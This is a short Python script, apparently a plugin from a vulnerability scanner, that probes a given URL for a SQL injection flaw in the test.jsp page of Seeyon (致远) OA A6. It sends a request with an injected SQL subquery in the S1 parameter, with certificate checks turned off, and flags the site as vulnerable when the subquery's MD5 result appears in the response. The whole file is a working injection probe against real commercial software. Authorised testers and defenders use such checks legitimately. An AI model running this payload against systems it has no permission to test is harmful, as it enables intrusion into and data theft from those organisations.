#!/usr/bin/env python
# coding=utf-8
#致远OAA6test.jspSQL注入漏洞
import requests, threading,base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(url=url + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(2))',verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if 'c81e728d9d4c2f636f067f89cc14862c' in response.text and 'md5(2)' in response.text:
            print(colored('[+]存在致远OAA6test.jspSQL注入漏洞', 'red'))
            results = f'{url}-->存在致远OAA6test.jspSQL注入漏洞'
        else:
            print('[-]不存在致远OAA6test.jspSQL注入漏洞')
    except:
        print('[-]不存在致远OAA6test.jspSQL注入漏洞')


def zhiyuanOAtestsql(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

